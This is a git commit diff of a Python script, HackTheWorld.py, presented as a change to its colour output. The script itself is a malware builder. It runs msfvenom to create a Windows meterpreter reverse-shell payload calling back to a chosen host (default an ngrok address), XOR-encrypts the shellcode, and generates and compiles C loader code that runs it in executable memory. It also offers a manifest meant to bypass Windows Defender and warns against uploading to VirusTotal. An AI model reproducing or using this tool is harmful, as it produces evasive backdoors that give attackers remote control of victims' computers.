3294a4b1c0efa4fc3b25989636cc05c9fb112347
nimxj <github@aidanmitchell.uk>
2020-04-28 21:05:13 +0100

    feat: simplified the colouring system

--- HackTheWorld.py
+++ HackTheWorld.py
@@ -7,17 +7,36 @@ import string
 import hashlib
 
 
-def banner():
-	return """
-  _    _            _      _______ _           __          __        _     _ 
- | |  | |          | |    |__   __| |          \ \        / /       | |   | |
- | |__| | __ _  ___| | __    | |  | |__   ___   \ \  /\  / /__  _ __| | __| |
- |  __  |/ _` |/ __| |/ /    | |  | '_ \ / _ \   \ \/  \/ / _ \| '__| |/ _` |
- | |  | | (_| | (__|   <     | |  | | | |  __/    \  /\  / (_) | |  | | (_| |
- |_|  |_|\__,_|\___|_|\_\    |_|  |_| |_|\___|     \/  \/ \___/|_|  |_|\__,_|
-																			 
-																			 
-"""
+colour_codes = {
+	"GREEN": "\033[1;32m",
+	"YELLOW": "\033[1;33m",
+	"MAGENTA": "\033[1;35m",
+	"CYAN": "\033[1;36m",
+	"BLUE": "\033[1;34m",
+	"RESET_ALL": "\033[0m",
+}
+
+_print_base = lambda message, prefix, colour : f"{colour}[{prefix}]{colour_codes['RESET_ALL']} {message}"
+
+
+def print_status(message):
+	"""Indicate normal program output"""
+	return _print_base(message, "*", colour_codes["CYAN"])
+
+
+def print_query(message):
+	"""Indicate user input expected"""
+	return _print_base(message, "?", colour_codes["YELLOW"])
+
+
+def print_success(message):
+	"""Indicate success"""
+	return _print_base(message, "+", colour_codes["GREEN"])
+
+
+def print_error(message):
+	"""Indicate failure"""
+	return _print_base(message, "!", colour_codes["MAGENTA"])
 
 
 def random_string(length=10):
@@ -50,48 +69,27 @@ def writetofile(data, key, output_file):
 				shellcode_lines.append(f"char {names[5]}[sizeof {names[3]}];\nint j = 0;\nfor (int i = 0; i < sizeof {names[3]}; i++) {{\nif (j == sizeof {names[7]} - 1) j = 0;\n{names[5]}[i] = {names[3]}[i] ^ {names[7]}[j];\nj++;\n}}\n")
 				shellcode_lines.append(f"void *{names[6]} = VirtualAlloc(0, sizeof {names[5]}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nmemcpy({names[6]}, {names[5]}, sizeof {names[5]});CreateThread(NULL, 0,{names[6]}, NULL, 0, NULL);\n\nwhile (1) {{\nif (!{names[8]}()) {{ return 0; }}\n}}\n}}\n}}\n}}\n")
 				f.writelines(shellcode_lines)
-			print(color(f"[+] Encrypted Shellcode saved in [{output_file}]"))
+			print(print_success(f"Encrypted Shellcode saved in [{output_file}]"))
 		except IOError as e:
-			print(color(f"[!] Could not write C++ code to [{output_file}]"))
+			print(print_error(f"[!] Could not write C++ code to [{output_file}]"))
 			raise SystemExit(e)
-
-
-def color(string, color=None):
-	attr = []
-	attr.append("1")
-
-	if color:
-		if color.lower() == "red":
-			attr.append("31")
-		elif color.lower() == "green":
-			attr.append("32")
-		elif color.lower() == "blue":
-			attr.append("34")
-		return "\x1b[%sm%s\x1b[0m" % (";".join(attr), string)
-
-	else:
-		if string.strip().startswith("[!]"):
-			attr.append("31")
-			return "\x1b[%sm%s\x1b[0m" % (";".join(attr), string)
-		elif string.strip().startswith("[+]"):
-			attr.append("32")
-			return "\x1b[%sm%s\x1b[0m" % (";".join(attr), string)
-		elif string.strip().startswith("[?]"):
-			attr.append("33")
-			return "\x1b[%sm%s\x1b[0m" % (";".join(attr), string)
-		elif string.strip().startswith("[*]"):
-			attr.append("34")
-			return "\x1b[%sm%s\x1b[0m" % (";".join(attr), string)
-		else:
-			return string
 
 
 if __name__ == "__main__":
 	os.system("clear")
-	print(color(banner(), "green"))
-	print(
-		color(
-			"""
+	
+	print(f'''{colour_codes["GREEN"]}
+  _    _            _      _______ _           __          __        _     _ 
+ | |  | |          | |    |__   __| |          \ \        / /       | |   | |
+ | |__| | __ _  ___| | __    | |  | |__   ___   \ \  /\  / /__  _ __| | __| |
+ |  __  |/ _` |/ __| |/ /    | |  | '_ \ / _ \   \ \/  \/ / _ \| '__| |/ _` |
+ | |  | | (_| | (__|   <     | |  | | | |  __/    \  /\  / (_) | |  | | (_| |
+ |_|  |_|\__,_|\___|_|\_\    |_|  |_| |_|\___|     \/  \/ \___/|_|  |_|\__,_|
+																			 
+																			 
+{colour_codes['RESET_ALL']}''')
+
+	print(f'''{colour_codes["BLUE"]}
 ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗	~ Script By SKS  ☪ ~
 ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝    ~ Revised for Python3 by nimxj ~
 ███████╗██║     ██████╔╝██║██████╔╝   ██║   
@@ -99,87 +97,84 @@ if __name__ == "__main__":
 ███████║╚██████╗██║  ██║██║██║        ██║   
 ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   
 											
-""",
-			"blue",
-		)
-	)
+{colour_codes['RESET_ALL']}''')
 
-	payload_type = input(color("[?] Enter Payload TYPE [tcp,https,tcp_dns]: "))
+	payload_type = input(print_query("Enter Payload TYPE [tcp,https,tcp_dns]: "))
 	# If payload_type==None, default to "tcp"
 	payload_type = payload_type or "tcp"
-	print(color("[+] Payload TYPE : " + payload_type))
+	print(print_success(f"Payload TYPE : {payload_type}"))
 
-	lhost = input(color("[?] Enter LHOST for Payload [LHOST] : "))
+	lhost = input(print_query("Enter LHOST for Payload [LHOST]: "))
 	# If lhost==None, default to "0.tcp.ngrok.io"
 	lhost = lhost or "0.tcp.ngrok.io"
-	print(color("[+] LHOST for Payload [LPORT] : " + lhost))
+	print(print_success(f"LHOST for Payload [LPORT] : {lhost}"))
 
 	lport = None
 	while not lport:
-		lport = input(color(" [?] Enter LPORT for Payload : "))
-	print(color("[+] LPORT for Payload : " + lport))
+		lport = input(print_query("Enter LPORT for Payload: "))
+	print(print_success(f"LPORT for Payload : {lport}"))
 
 	raw_payload = (f"msfvenom -p windows/x64/meterpreter_reverse_{payload_type} LHOST={lhost} LPORT={lport} EXITFUNC=process --platform windows -a x64 -f raw -o ./result/test.raw")
 
-	print(color("[✔] Checking directories...", "green"))
+	print(print_status("Checking directories..."))
 	
+	print(print_status("Creating [./result] directory for resulting code files"))
 	os.makedirs("./result", exist_ok=True)
-	print(color("[+] Creating [./result] directory for resulting code files", "green"))
 	os.system(raw_payload)
 
 	try:
 		shellcode_output = "./result/test.raw"
 		with open(shellcode_output, encoding="utf-8", errors="ignore") as shellcode_output_handle:
 			shellcode_bytes = bytearray(shellcode_output_handle.read(), "utf8")
-			print(color(f"[*] Shellcode file [{shellcode_output}] successfully loaded"))
+			print(print_status(f"Shellcode file [{shellcode_output}] successfully loaded"))
 	except IOError as e:
-		print(color(f"[!] Could not open or read file [{shellcode_output}]"))
+		print(print_error(f"Could not open or read file [{shellcode_output}]"))
 		raise SystemExit(e)
 
-	print(color(f"[*] MD5 hash of the initial shellcode: [{hashlib.MD5(shellcode_bytes).hexdigest()}]"))
-	print(color(f"[*] Shellcode size: [{len(shellcode_bytes)}] bytes"))
+	print(print_status(f"MD5 hash of the initial shellcode: [{hashlib.MD5(shellcode_bytes).hexdigest()}]"))
+	print(print_status(f"Shellcode size: [{len(shellcode_bytes)}] bytes"))
 
-	master_key = input(color(" [?] Enter the Key to Encrypt Shellcode with : "))
-	print(color(f"[+] XOR Encrypting the shellcode with key [{master_key}]"))
+	master_key = input(print_query("Enter the Key to Encrypt Shellcode with: "))
+	print(print_success(f"XOR Encrypting the shellcode with key [{master_key}]"))
 	transformed_shellcode = xor(shellcode_bytes, master_key)
 
-	print(color(f"[*] Encrypted shellcode size: [{len(transformed_shellcode)}] bytes"))
+	print(print_status(f"Encrypted shellcode size: [{len(transformed_shellcode)}] bytes"))
 
 	# Writing To File
-	print(color("[*] Generating C code file"))
+	print(print_status("Generating C code file"))
 	source_file = f"./result/final_{lport}.c"
 	writetofile(transformed_shellcode, master_key, source_file)
 
 	# Compiling
 	exe_name = f"./result/final_{lport}"
-	print(color(f"[+] Compiling file [{source_file}] with Mingw Compiler "))
+	print(print_success(f"Compiling file [{source_file}] with Mingw Compiler "))
 
 	compilation_string = f"x86_64-w64-mingw32-gcc {source_file} -o {exe_name}.exe"
 	os.system(compilation_string)
 
-	print(color("[+] Compiled Sucessfully"))
-	print(color("[+] Removing Temp Files"))
+	print(print_success("Compiled Sucessfully"))
+	print(print_success("Removing Temp Files"))
 	os.remove("./result/test.raw")
 	os.remove(source_file)
 
 	manifest = f"wine mt.exe -manifest template.exe.manifest -outputresource:{exe_name}.exe;#1 "
 
-	while generate_manifest:= input(color("[*]Do you want to add Manifest (Generally Bypasses Windows Defender)? (Y/N) ")).lower().strip():
+	while generate_manifest:= input(print_query("Do you want to add Manifest (Generally Bypasses Windows Defender)? (Y/N) ")).lower().strip():
 		if generate_manifest not in ("y", "n"):
-			print(color("[!] Answer must be 'Y' or 'N'"))
+			print(print_error("Answer must be 'Y' or 'N'"))
 			continue
 		else: break
 
 	# Display Results
-	print(color(f"\n{'='*36} RESULT {'='*36}\n"))
+	print(f"\n{'='*36} RESULT {'='*36}\n")
 
 	if generate_manifest == "y":
-		print(color("[+] Adding Manifest"))
+		print(print_status("Adding Manifest"))
 		os.system(manifest)
-		print(color(f"[+] Final File with Manifest [{exe_name}.exe]"))
+		print(print_success(f"Final File with Manifest [{exe_name}.exe]"))
 	else:
-		print(color(f"[+] Final File [{exe_name}.exe] "))
+		print(print_success(f"Final File [{exe_name}.exe] "))
 
-	print(color("\n DO NOT UPLOAD ON VIRUS TOTAL \n", "red"))
-	print(color('\n USE "nodistribute.com "\n', "green"))
-	print(color("\n Happy Hacking \n", "green"))
+	print(print_error("\n DO NOT UPLOAD ON VIRUS TOTAL \n"))
+	print(print_status('\n USE "nodistribute.com "\n'))
+	print(print_success("\n Happy Hacking \n"))
